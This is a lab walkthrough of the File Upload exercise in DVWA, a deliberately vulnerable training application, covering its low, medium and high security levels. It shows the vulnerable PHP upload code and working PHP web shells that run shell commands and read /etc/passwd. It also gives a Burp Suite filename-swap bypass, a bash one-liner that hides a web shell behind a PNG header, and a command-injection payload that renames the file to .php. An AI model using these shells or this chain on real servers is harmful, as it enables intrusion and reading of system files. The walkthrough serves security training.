# DVWA - File Upload

## Description

**Vulnerability:** File Upload    
**Impact:** Leveraging file upload functionality to gain access to server.

---

## LOW Security Level
This level has this source code:
```php
if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // Can we move the file to the upload folder?
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        echo '<pre>Your image was not uploaded.</pre>';
    }
    else {
        // Yes!
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}
```

So this is simple when upload a file to the server it will be saved to this folder `/hackable/uploads` so after uploading we can get access to the file through `/hackable/uploads/<filename>`.

Searching about **PHP Web Shell** you can find a lot of code to run commands on the server then `echo` the result to out view. The PHP is:

```php
<?php
    $output = shell_exec('cat /etc/passwd');
    echo "<pre>$output</pre>";
?>
```

Create a `shell.php` with that command and upload to the server. Browse `/hackable/uploads/shell.php` you should see the `/etc/passwd` content of your system.


## MEDIUM Security Level
In this level, we will use Burp Suite to change the filename in order for the web app to run our PHP code.

We have to change the filename of our created PHP code from `shell.php` to `shell.php.jpg` which is acceptable to be uploaded to the app because the server has this check in the source code:

```php
// Is it an image?
if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
    ( $uploaded_size < 100000 ) ) {

    // Can we move the file to the upload folder?
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        echo '<pre>Your image was not uploaded.</pre>';
    }
    else {
        // Yes!
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}
else {
    // Invalid file
    echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
}
```

We cannot upload a file that isn't `.jpeg` or `.png`. Before upload `shell.php.jpg` I will turn on Intercept in Burp Suite and upload the file.

In the captured request I will change the `shell.php.jpg` to the original `shell.php`. By this way we can bypass the check but still can run our PHP code.

Visit `/hackable/uploads/shell.php` we should get our desired result.

## HIGH Security Level
The updated source code has new check:
```php
if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
    ( $uploaded_size < 100000 ) &&
    getimagesize( $uploaded_tmp ) ) {
        // ...
    }
```

This code will prevent us using the approach from MEDIUM security level. We have to create a fake image file. Use this code to fake a `shell.png` file:
```bash
echo -ne '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a<?php system($_GET["cmd"]); ?>' > shell.png
```

Upload the `shell.png`, it should be successful.  Then we have to combine with `Command Injection` vulnerability with this payload:
```bash
1.1.1.1|mv ../../hackable/uploads/shell.png ../../hackable/uploads/shell.php
```

Then visit `/hackable/uploads/shell.php?cmd=cat /etc/passwd`. You should get the content of `/etc/passwd` of your own system.

## Resources
- https://www.acunetix.com/websitesecurity/upload-forms-threat/
- https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload